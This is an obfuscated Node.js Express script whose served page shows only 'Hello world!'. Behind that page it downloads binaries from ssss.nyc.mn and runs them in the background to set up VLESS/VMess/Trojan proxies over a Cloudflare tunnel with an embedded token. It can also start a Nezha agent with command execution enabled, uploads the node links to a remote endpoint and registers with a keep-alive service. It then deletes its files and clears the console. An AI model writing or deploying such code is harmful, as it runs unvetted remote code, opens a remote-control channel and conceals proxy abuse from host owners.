function _0x3036(){const _0x11f6a7=['2087','Unhandled\x20error\x20in\x20startserver:','stringify','PROJECT_URL','tunnel.yml','existsSync','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/agent','1146592yNxpkf','https+local://8.8.8.8/dns-query','FILE_PATH','/trojan-argo','config.yaml','then','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://arm64.ssss.nyc.mn/bot','push','8223b0c8-1379-4721-985e-25c5e4b26c2e','utf-8','&path=%2Fvless-argo%3Fed%3D2560#','cdn.dqpb.dpdns.org','49850PUFdBX','includes','NEZHA_PORT','\x20already\x20exists','Error\x20in\x20startserver:','quic','\x0a\x20\x20credentials-file:\x20','/vmess-argo','https://amd64.ssss.nyc.mn/v1','/sub.txt\x20saved\x20successfully','CFPORT','ArgoDomain:','listen','Error\x20executing\x20command:\x20','webcdndns','readFileSync','SERVER_PORT','?security=tls&sni=','ARGO_DOMAIN','cdns.doon.eu.org','tcp','unlinkSync','response','forEach','https://amd64.ssss.nyc.mn/bot','win32','1MdTVMf','unlink','--tls','https://arm64.ssss.nyc.mn/web','Skipping\x20adding\x20automatic\x20access\x20task','filter','message','arm','/vmess-argo?ed=2560','2083','trojan','from','Empowerment\x20failed\x20for\x20','NEZHA_SERVER','firefox','charAt','arm64','vless','29982NEYIYA','/tunnel.yml\x20run','php\x20running\x20error:\x20','set','?encryption=none&security=tls&sni=','npm\x20running\x20error:\x20','test','join','\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','false','http','Nodes\x20uploaded\x20successfully','env','close','/api/add-nodes','Deleted\x20file:\x20','.exe\x20>\x20nul\x202>&1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','clear','/config.json\x20>/dev/null\x202>&1\x20&','split','/vless-argo','all','\x20-c\x20\x22','automatic\x20access\x20task\x20added\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','error','127.0.0.1','express','18rGpkyw','PORT','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','eyJhIjoiN2ZmY2MwMjMyM2U4OTFlNTk4MTZlMTljNzg3Nzg1NDYiLCJ0IjoiMGVlZDcxMjctM2Y1MS00M2FkLWJhNDMtNDg0ZDFjODM4NmIwIiwicyI6Ik4ySTJNemcwWWpFdFlUWXdaaTAwT0RNNUxXSXhaamN0TVRZNE56WXlaVEppWkdOaiJ9','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','send','App\x20is\x20running','\x20-s\x20','length','axios','log','rm\x20-rf\x20','Error\x20downloading\x20files:','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','abcdefghijklmnopqrstuvwxyz','taskkill\x20/f\x20/im\x20','pipe','TunnelSecret','application/json','Download\x20','get','amd','&fp=firefox&type=ws&host=','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','child_process','55AvtHRB','10798JUBRlV','\x20failed:\x20','vmess','catch','\x0a\x20\x20\x20\x20','fileUrl','&path=%2Ftrojan-argo%3Fed%3D2560#','true','stream','\x20is\x20running','2096','platform','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Empowerment\x20success\x20for\x20','sub.txt','Error\x20reading\x20boot.log:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','pkill\x20-f\x20\x22[','ARGO_PORT','2053','/api/add-subscriptions','util','unshift','post','toString','\x20successfully','aarch64','basename','readdirSync','freedom','match','NEZHA_KEY','list.txt','status','floor','Hello\x20world!','\x20-c\x20','boot.log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','nohup\x20','config.json','chmod','writeFileSync','none','text/plain;\x20charset=utf-8','web\x20running\x20error:\x20','\x0avless://','block','\x20-p\x20','8443','/api/delete-nodes','2560360evpMAV','/dev/null','\x20is\x20created','random','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','443','tls','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0a\x20\x20\x0avmess://','2152458jJrlDu','finish','686445wLKuPC','base64','http\x20server\x20is\x20running\x20on\x20port:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tunnel.json'];_0x3036=function(){return _0x11f6a7;};return _0x3036();}const _0x3d5fc7=_0x2571;(function(_0x16fdc7,_0x2e503d){const _0x4b4b99=_0x2571,_0x5e354e=_0x16fdc7();while(!![]){try{const _0x159ca0=-parseInt(_0x4b4b99(0x254))/0x1*(-parseInt(_0x4b4b99(0x1e2))/0x2)+-parseInt(_0x4b4b99(0x220))/0x3+-parseInt(_0x4b4b99(0x22d))/0x4+parseInt(_0x4b4b99(0x1e1))/0x5*(parseInt(_0x4b4b99(0x266))/0x6)+parseInt(_0x4b4b99(0x21e))/0x7+parseInt(_0x4b4b99(0x215))/0x8+-parseInt(_0x4b4b99(0x285))/0x9*(parseInt(_0x4b4b99(0x23a))/0xa);if(_0x159ca0===_0x2e503d)break;else _0x5e354e['push'](_0x5e354e['shift']());}catch(_0x51e53e){_0x5e354e['push'](_0x5e354e['shift']());}}}(_0x3036,0x27aa8));const express=require(_0x3d5fc7(0x284)),app=express(),axios=require(_0x3d5fc7(0x28f)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x3d5fc7(0x1f7)),exec=promisify(require(_0x3d5fc7(0x1e0))['exec']),{execSync}=require(_0x3d5fc7(0x1e0)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x228)]||'',AUTO_ACCESS=process[_0x3d5fc7(0x273)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x3d5fc7(0x22f)]||'./tmp',SUB_PATH=process[_0x3d5fc7(0x273)]['SUB_PATH']||_0x3d5fc7(0x248),PORT=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x24a)]||process[_0x3d5fc7(0x273)][_0x3d5fc7(0x286)]||0xbb8,UUID=process[_0x3d5fc7(0x273)]['UUID']||_0x3d5fc7(0x236),NEZHA_SERVER=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x261)]||'',NEZHA_PORT=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x23c)]||'',NEZHA_KEY=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x201)]||'',ARGO_DOMAIN=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x24c)]||_0x3d5fc7(0x239),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x3d5fc7(0x289),ARGO_PORT=process['env'][_0x3d5fc7(0x1f4)]||0x1f41,CFIP=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x293)]||_0x3d5fc7(0x24d),CFPORT=process[_0x3d5fc7(0x273)][_0x3d5fc7(0x244)]||0x1bb,NAME=process['env']['NAME']||'';!fs[_0x3d5fc7(0x22a)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x3d5fc7(0x290)](FILE_PATH+_0x3d5fc7(0x217))):console[_0x3d5fc7(0x290)](FILE_PATH+_0x3d5fc7(0x23d));function generateRandomName(){const _0x42ed09=_0x3d5fc7,_0x5a6f3d=_0x42ed09(0x295);let _0x5596fc='';for(let _0x26039e=0x0;_0x26039e<0x6;_0x26039e++){_0x5596fc+=_0x5a6f3d[_0x42ed09(0x263)](Math[_0x42ed09(0x204)](Math[_0x42ed09(0x218)]()*_0x5a6f3d['length']));}return _0x5596fc;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3d5fc7(0x26d)](FILE_PATH,npmName),phpPath=path[_0x3d5fc7(0x26d)](FILE_PATH,phpName),webPath=path[_0x3d5fc7(0x26d)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x3d5fc7(0x26d)](FILE_PATH,_0x3d5fc7(0x1f0)),listPath=path['join'](FILE_PATH,_0x3d5fc7(0x202)),bootLogPath=path[_0x3d5fc7(0x26d)](FILE_PATH,'boot.log'),configPath=path[_0x3d5fc7(0x26d)](FILE_PATH,_0x3d5fc7(0x20a));function deleteNodes(){const _0x4f8858=_0x3d5fc7;try{if(!UPLOAD_URL)return;if(!fs[_0x4f8858(0x22a)](subPath))return;let _0x218080;try{_0x218080=fs[_0x4f8858(0x249)](subPath,_0x4f8858(0x237));}catch{return null;}const _0x15071c=Buffer[_0x4f8858(0x25f)](_0x218080,_0x4f8858(0x221))[_0x4f8858(0x1fa)](_0x4f8858(0x237)),_0x2d128c=_0x15071c[_0x4f8858(0x27c)]('\x0a')[_0x4f8858(0x259)](_0x2f54a5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f8858(0x26c)](_0x2f54a5));if(_0x2d128c['length']===0x0)return;return axios[_0x4f8858(0x1f9)](UPLOAD_URL+_0x4f8858(0x214),JSON[_0x4f8858(0x227)]({'nodes':_0x2d128c}),{'headers':{'Content-Type':'application/json'}})[_0x4f8858(0x1e5)](_0x47b01e=>{return null;}),null;}catch(_0x3f45cb){return null;}}function cleanupOldFiles(){const _0xc9917a=_0x3d5fc7;try{const _0x47aa08=fs[_0xc9917a(0x1fe)](FILE_PATH);_0x47aa08[_0xc9917a(0x251)](_0x302013=>{const _0x14d31f=_0xc9917a,_0x349ff5=path[_0x14d31f(0x26d)](FILE_PATH,_0x302013);try{fs[_0x14d31f(0x24f)](_0x349ff5),console['log'](_0x14d31f(0x276)+_0x349ff5);}catch(_0x936ba1){console[_0x14d31f(0x282)]('Failed\x20to\x20delete\x20file:\x20'+_0x349ff5,_0x936ba1);}});}catch(_0xed17ad){console[_0xc9917a(0x282)]('Failed\x20to\x20read\x20directory:\x20'+FILE_PATH,_0xed17ad);}}app['get']('/',function(_0x39d3cd,_0x370ab1){const _0x54b6d4=_0x3d5fc7;_0x370ab1['send'](_0x54b6d4(0x205));});async function generateConfig(){const _0xbd26f1=_0x3d5fc7,_0x2a9eb6={'log':{'access':_0xbd26f1(0x216),'error':_0xbd26f1(0x216),'loglevel':_0xbd26f1(0x20d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xbd26f1(0x265),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0xbd26f1(0x20d),'fallbacks':[{'dest':0xbb9},{'path':_0xbd26f1(0x27d),'dest':0xbba},{'path':_0xbd26f1(0x241),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0xbd26f1(0x24e)}},{'port':0xbb9,'listen':_0xbd26f1(0x283),'protocol':_0xbd26f1(0x265),'settings':{'clients':[{'id':UUID}],'decryption':_0xbd26f1(0x20d)},'streamSettings':{'network':_0xbd26f1(0x24e),'security':'none'}},{'port':0xbba,'listen':_0xbd26f1(0x283),'protocol':_0xbd26f1(0x265),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xbd26f1(0x20d)},'streamSettings':{'network':'ws','security':_0xbd26f1(0x20d),'wsSettings':{'path':_0xbd26f1(0x27d)}},'sniffing':{'enabled':!![],'destOverride':[_0xbd26f1(0x271),_0xbd26f1(0x21b),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xbd26f1(0x283),'protocol':_0xbd26f1(0x1e4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0xbd26f1(0x21b),_0xbd26f1(0x23f)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0xbd26f1(0x25e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xbd26f1(0x20d),'wsSettings':{'path':_0xbd26f1(0x230)}},'sniffing':{'enabled':!![],'destOverride':[_0xbd26f1(0x271),_0xbd26f1(0x21b),_0xbd26f1(0x23f)],'metadataOnly':![]}}],'dns':{'servers':[_0xbd26f1(0x22e)]},'outbounds':[{'protocol':_0xbd26f1(0x1ff),'tag':'direct'},{'protocol':'blackhole','tag':_0xbd26f1(0x211)}]};fs[_0xbd26f1(0x20c)](path[_0xbd26f1(0x26d)](FILE_PATH,_0xbd26f1(0x20a)),JSON[_0xbd26f1(0x227)](_0x2a9eb6,null,0x2));}function getSystemArchitecture(){const _0x11d7b4=_0x3d5fc7,_0x556f7c=os['arch']();return _0x556f7c==='arm'||_0x556f7c===_0x11d7b4(0x264)||_0x556f7c===_0x11d7b4(0x1fc)?_0x11d7b4(0x25b):_0x11d7b4(0x1dd);}function downloadFile(_0x122e93,_0x38ad73,_0x636afd){const _0x1f2498=_0x3d5fc7,_0x21669b=_0x122e93;!fs[_0x1f2498(0x22a)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x5ca9f3=fs['createWriteStream'](_0x21669b);axios({'method':'get','url':_0x38ad73,'responseType':_0x1f2498(0x1ea)})[_0x1f2498(0x232)](_0xf0095=>{const _0x21e925=_0x1f2498;_0xf0095['data'][_0x21e925(0x297)](_0x5ca9f3),_0x5ca9f3['on'](_0x21e925(0x21f),()=>{const _0x1e3aaa=_0x21e925;_0x5ca9f3[_0x1e3aaa(0x274)](),console[_0x1e3aaa(0x290)](_0x1e3aaa(0x1db)+path[_0x1e3aaa(0x1fd)](_0x21669b)+_0x1e3aaa(0x1fb)),_0x636afd(null,_0x21669b);}),_0x5ca9f3['on'](_0x21e925(0x282),_0x222aef=>{const _0x56e4b2=_0x21e925;fs[_0x56e4b2(0x255)](_0x21669b,()=>{});const _0x5c432f='Download\x20'+path[_0x56e4b2(0x1fd)](_0x21669b)+'\x20failed:\x20'+_0x222aef['message'];console[_0x56e4b2(0x282)](_0x5c432f),_0x636afd(_0x5c432f);});})[_0x1f2498(0x1e5)](_0x1ce7b4=>{const _0x390013=_0x1f2498,_0xa71af8=_0x390013(0x1db)+path[_0x390013(0x1fd)](_0x21669b)+_0x390013(0x1e3)+_0x1ce7b4[_0x390013(0x25a)];console['error'](_0xa71af8),_0x636afd(_0xa71af8);});}function _0x2571(_0x3c421c,_0x28e1c3){const _0x30364d=_0x3036();return _0x2571=function(_0x2571d6,_0x164a46){_0x2571d6=_0x2571d6-0x1d9;let _0x3ad370=_0x30364d[_0x2571d6];return _0x3ad370;},_0x2571(_0x3c421c,_0x28e1c3);}async function downloadFilesAndRun(){const _0x268268=_0x3d5fc7,_0x1c05fa=getSystemArchitecture(),_0x182c36=getFilesForArchitecture(_0x1c05fa);if(_0x182c36[_0x268268(0x28e)]===0x0){console[_0x268268(0x290)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1e3394=_0x182c36['map'](_0x995146=>{return new Promise((_0x30fc35,_0x5eb1c6)=>{const _0x42af55=_0x2571;downloadFile(_0x995146['fileName'],_0x995146[_0x42af55(0x1e7)],(_0x541753,_0x9384b4)=>{_0x541753?_0x5eb1c6(_0x541753):_0x30fc35(_0x9384b4);});});});try{await Promise[_0x268268(0x27e)](_0x1e3394);}catch(_0x410659){console[_0x268268(0x282)](_0x268268(0x292),_0x410659);return;}function _0x273f41(_0x52f653){const _0x159599=0x1fd;_0x52f653['forEach'](_0x1a3573=>{const _0x167968=_0x2571;fs[_0x167968(0x22a)](_0x1a3573)&&fs[_0x167968(0x20b)](_0x1a3573,_0x159599,_0x17ad67=>{const _0x1169c3=_0x167968;_0x17ad67?console['error'](_0x1169c3(0x260)+_0x1a3573+':\x20'+_0x17ad67):console[_0x1169c3(0x290)](_0x1169c3(0x1ef)+_0x1a3573+':\x20'+_0x159599[_0x1169c3(0x1fa)](0x8));});});}const _0xf4a1e8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x273f41(_0xf4a1e8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x41ca98=NEZHA_SERVER[_0x268268(0x23b)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x138ccf=new Set([_0x268268(0x21a),_0x268268(0x213),'2096',_0x268268(0x225),'2083',_0x268268(0x1f5)]),_0x19dfcd=_0x138ccf['has'](_0x41ca98)?_0x268268(0x1e9):_0x268268(0x270),_0x3065b6=_0x268268(0x22b)+NEZHA_KEY+_0x268268(0x208)+NEZHA_SERVER+_0x268268(0x223)+_0x19dfcd+_0x268268(0x278)+UUID;fs['writeFileSync'](path[_0x268268(0x26d)](FILE_PATH,_0x268268(0x231)),_0x3065b6);const _0x18bbc0=_0x268268(0x209)+phpPath+_0x268268(0x27f)+FILE_PATH+_0x268268(0x1ee);try{await exec(_0x18bbc0),console[_0x268268(0x290)](phpName+_0x268268(0x1eb)),await new Promise(_0x1884a1=>setTimeout(_0x1884a1,0x3e8));}catch(_0x29aca3){console[_0x268268(0x282)](_0x268268(0x268)+_0x29aca3);}}else{let _0x40a7da='';const _0x924916=[_0x268268(0x21a),'8443',_0x268268(0x1ec),_0x268268(0x225),_0x268268(0x25d),_0x268268(0x1f5)];_0x924916[_0x268268(0x23b)](NEZHA_PORT)&&(_0x40a7da=_0x268268(0x256));const _0x2b199f=_0x268268(0x209)+npmPath+_0x268268(0x28d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x268268(0x212)+NEZHA_KEY+'\x20'+_0x40a7da+_0x268268(0x1f2);try{await exec(_0x2b199f),console[_0x268268(0x290)](npmName+_0x268268(0x1eb)),await new Promise(_0x548b7e=>setTimeout(_0x548b7e,0x3e8));}catch(_0x237cc8){console[_0x268268(0x282)](_0x268268(0x26b)+_0x237cc8);}}}else console['log'](_0x268268(0x233));const _0x51fa15='nohup\x20'+webPath+_0x268268(0x206)+FILE_PATH+_0x268268(0x27b);try{await exec(_0x51fa15),console['log'](webName+_0x268268(0x1eb)),await new Promise(_0x41f86c=>setTimeout(_0x41f86c,0x3e8));}catch(_0x5e94ea){console[_0x268268(0x282)](_0x268268(0x20f)+_0x5e94ea);}if(fs[_0x268268(0x22a)](botPath)){let _0x3c5464;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x3c5464='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x268268(0x200)](/TunnelSecret/)?_0x3c5464=_0x268268(0x26f)+FILE_PATH+_0x268268(0x267):_0x3c5464=_0x268268(0x294)+FILE_PATH+_0x268268(0x288)+ARGO_PORT;try{await exec(_0x268268(0x209)+botPath+'\x20'+_0x3c5464+'\x20>/dev/null\x202>&1\x20&'),console[_0x268268(0x290)](botName+_0x268268(0x1eb)),await new Promise(_0x3aed00=>setTimeout(_0x3aed00,0x7d0));}catch(_0x54bc51){console[_0x268268(0x282)](_0x268268(0x247)+_0x54bc51);}}await new Promise(_0x45199b=>setTimeout(_0x45199b,0x1388));}function getFilesForArchitecture(_0x1c8ec2){const _0x3e2133=_0x3d5fc7;let _0xa0d2e7;_0x1c8ec2===_0x3e2133(0x25b)?_0xa0d2e7=[{'fileName':webPath,'fileUrl':_0x3e2133(0x257)},{'fileName':botPath,'fileUrl':_0x3e2133(0x234)}]:_0xa0d2e7=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3e2133(0x252)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xf6955=_0x1c8ec2===_0x3e2133(0x25b)?'https://arm64.ssss.nyc.mn/agent':_0x3e2133(0x22c);_0xa0d2e7[_0x3e2133(0x1f8)]({'fileName':npmPath,'fileUrl':_0xf6955});}else{const _0x2a3bb4=_0x1c8ec2==='arm'?_0x3e2133(0x287):_0x3e2133(0x242);_0xa0d2e7['unshift']({'fileName':phpPath,'fileUrl':_0x2a3bb4});}}return _0xa0d2e7;}function argoType(){const _0x2caa71=_0x3d5fc7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2caa71(0x290)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x2caa71(0x1d9))){fs[_0x2caa71(0x20c)](path[_0x2caa71(0x26d)](FILE_PATH,_0x2caa71(0x224)),ARGO_AUTH);const _0x3284ec='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2caa71(0x27c)]('\x22')[0xb]+_0x2caa71(0x240)+path[_0x2caa71(0x26d)](FILE_PATH,_0x2caa71(0x224))+_0x2caa71(0x28a)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x2caa71(0x21c);fs['writeFileSync'](path[_0x2caa71(0x26d)](FILE_PATH,_0x2caa71(0x229)),_0x3284ec);}else console[_0x2caa71(0x290)](_0x2caa71(0x279));}argoType();async function extractDomains(){const _0x1ce894=_0x3d5fc7;let _0x222a89;if(ARGO_AUTH&&ARGO_DOMAIN)_0x222a89=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x222a89),await _0x1a8bee(_0x222a89);else try{const _0x3e98ac=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x1ce894(0x237)),_0x456edd=_0x3e98ac['split']('\x0a'),_0x4544ac=[];_0x456edd[_0x1ce894(0x251)](_0x254999=>{const _0x5a2ced=_0x1ce894,_0x5689f8=_0x254999[_0x5a2ced(0x200)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5689f8){const _0x20ba8e=_0x5689f8[0x1];_0x4544ac[_0x5a2ced(0x235)](_0x20ba8e);}});if(_0x4544ac[_0x1ce894(0x28e)]>0x0)_0x222a89=_0x4544ac[0x0],console[_0x1ce894(0x290)](_0x1ce894(0x245),_0x222a89),await _0x1a8bee(_0x222a89);else{console[_0x1ce894(0x290)](_0x1ce894(0x219)),fs[_0x1ce894(0x24f)](path[_0x1ce894(0x26d)](FILE_PATH,_0x1ce894(0x207)));async function _0x36e11f(){const _0x56bd0a=_0x1ce894;try{process[_0x56bd0a(0x1ed)]===_0x56bd0a(0x253)?await exec(_0x56bd0a(0x296)+botName+_0x56bd0a(0x277)):await exec(_0x56bd0a(0x1f3)+botName[_0x56bd0a(0x263)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0xe05899){}}_0x36e11f(),await new Promise(_0x4df42d=>setTimeout(_0x4df42d,0xbb8));const _0x585ed7=_0x1ce894(0x294)+FILE_PATH+_0x1ce894(0x288)+ARGO_PORT;try{await exec(_0x1ce894(0x209)+botPath+'\x20'+_0x585ed7+_0x1ce894(0x26e)),console[_0x1ce894(0x290)](botName+_0x1ce894(0x1eb)),await new Promise(_0x553014=>setTimeout(_0x553014,0xbb8)),await extractDomains();}catch(_0x30560b){console['error']('Error\x20executing\x20command:\x20'+_0x30560b);}}}catch(_0x1b66b2){console[_0x1ce894(0x282)](_0x1ce894(0x1f1),_0x1b66b2);}async function _0x1a8bee(_0x1a6493){const _0x38ab36=_0x1ce894,_0x2ef970=execSync(_0x38ab36(0x1df),{'encoding':_0x38ab36(0x237)}),_0x505291=_0x2ef970['trim'](),_0x1811be=NAME?NAME+'-'+_0x505291:_0x505291;return new Promise(_0x2ea5fc=>{setTimeout(()=>{const _0x4c3a95=_0x2571,_0xda6a34={'v':'2','ps':''+_0x1811be,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4c3a95(0x20d),'net':'ws','type':'none','host':_0x1a6493,'path':_0x4c3a95(0x25c),'tls':'tls','sni':_0x1a6493,'alpn':'','fp':_0x4c3a95(0x262)},_0x2c80b8=_0x4c3a95(0x210)+UUID+'@'+CFIP+':'+CFPORT+_0x4c3a95(0x26a)+_0x1a6493+_0x4c3a95(0x1de)+_0x1a6493+_0x4c3a95(0x238)+_0x1811be+_0x4c3a95(0x21d)+Buffer[_0x4c3a95(0x25f)](JSON[_0x4c3a95(0x227)](_0xda6a34))[_0x4c3a95(0x1fa)](_0x4c3a95(0x221))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4c3a95(0x24b)+_0x1a6493+'&fp=firefox&type=ws&host='+_0x1a6493+_0x4c3a95(0x1e8)+_0x1811be+_0x4c3a95(0x1e6);console[_0x4c3a95(0x290)](Buffer[_0x4c3a95(0x25f)](_0x2c80b8)['toString'](_0x4c3a95(0x221))),fs['writeFileSync'](subPath,Buffer[_0x4c3a95(0x25f)](_0x2c80b8)[_0x4c3a95(0x1fa)](_0x4c3a95(0x221))),console[_0x4c3a95(0x290)](FILE_PATH+_0x4c3a95(0x243)),uploadNodes(),app[_0x4c3a95(0x1dc)]('/'+SUB_PATH,(_0x3d4542,_0x3669d2)=>{const _0x5bfd75=_0x4c3a95,_0x1ca7c1=Buffer[_0x5bfd75(0x25f)](_0x2c80b8)[_0x5bfd75(0x1fa)]('base64');_0x3669d2[_0x5bfd75(0x269)]('Content-Type',_0x5bfd75(0x20e)),_0x3669d2[_0x5bfd75(0x28b)](_0x1ca7c1);}),_0x2ea5fc(_0x2c80b8);},0x7d0);});}}async function uploadNodes(){const _0x54ccd6=_0x3d5fc7;if(UPLOAD_URL&&PROJECT_URL){const _0x3a0ed9=PROJECT_URL+'/'+SUB_PATH,_0x557279={'subscription':[_0x3a0ed9]};try{const _0x13c0b6=await axios[_0x54ccd6(0x1f9)](UPLOAD_URL+_0x54ccd6(0x1f6),_0x557279,{'headers':{'Content-Type':_0x54ccd6(0x1da)}});return _0x13c0b6&&_0x13c0b6[_0x54ccd6(0x203)]===0xc8?(console[_0x54ccd6(0x290)]('Subscription\x20uploaded\x20successfully'),_0x13c0b6):null;}catch(_0x6de08f){if(_0x6de08f[_0x54ccd6(0x250)]){if(_0x6de08f['response'][_0x54ccd6(0x203)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x54ccd6(0x22a)](listPath))return;const _0x53656b=fs['readFileSync'](listPath,'utf-8'),_0x45a610=_0x53656b[_0x54ccd6(0x27c)]('\x0a')[_0x54ccd6(0x259)](_0x57c1ab=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x57c1ab));if(_0x45a610['length']===0x0)return;const _0x2be390=JSON['stringify']({'nodes':_0x45a610});try{const _0x571c32=await axios[_0x54ccd6(0x1f9)](UPLOAD_URL+_0x54ccd6(0x275),_0x2be390,{'headers':{'Content-Type':_0x54ccd6(0x1da)}});return _0x571c32&&_0x571c32[_0x54ccd6(0x203)]===0xc8?(console[_0x54ccd6(0x290)](_0x54ccd6(0x272)),_0x571c32):null;}catch(_0x5351ce){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x361872=_0x2571,_0x1e8746=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1e8746[_0x361872(0x235)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1e8746[_0x361872(0x235)](phpPath);process[_0x361872(0x1ed)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x1e8746['join']('\x20')+'\x20>\x20nul\x202>&1',_0x3b6849=>{const _0x4ac8b9=_0x361872;console[_0x4ac8b9(0x27a)](),console[_0x4ac8b9(0x290)](_0x4ac8b9(0x28c)),console[_0x4ac8b9(0x290)](_0x4ac8b9(0x281));}):exec(_0x361872(0x291)+_0x1e8746['join']('\x20')+'\x20>/dev/null\x202>&1',_0x3d016f=>{const _0x5af7df=_0x361872;console['clear'](),console[_0x5af7df(0x290)](_0x5af7df(0x28c)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x8c60f2=_0x3d5fc7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x8c60f2(0x290)](_0x8c60f2(0x258));return;}try{const _0x5e7b36=await axios[_0x8c60f2(0x1f9)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x8c60f2(0x280)),_0x5e7b36;}catch(_0x3ec11d){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3ec11d['message']),null;}}async function startserver(){const _0x2769ed=_0x3d5fc7;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4ed565){console[_0x2769ed(0x282)](_0x2769ed(0x23e),_0x4ed565);}}startserver()[_0x3d5fc7(0x1e5)](_0x3232b0=>{const _0x2790c9=_0x3d5fc7;console[_0x2790c9(0x282)](_0x2790c9(0x226),_0x3232b0);}),app[_0x3d5fc7(0x246)](PORT,()=>console[_0x3d5fc7(0x290)](_0x3d5fc7(0x222)+PORT+'!'));
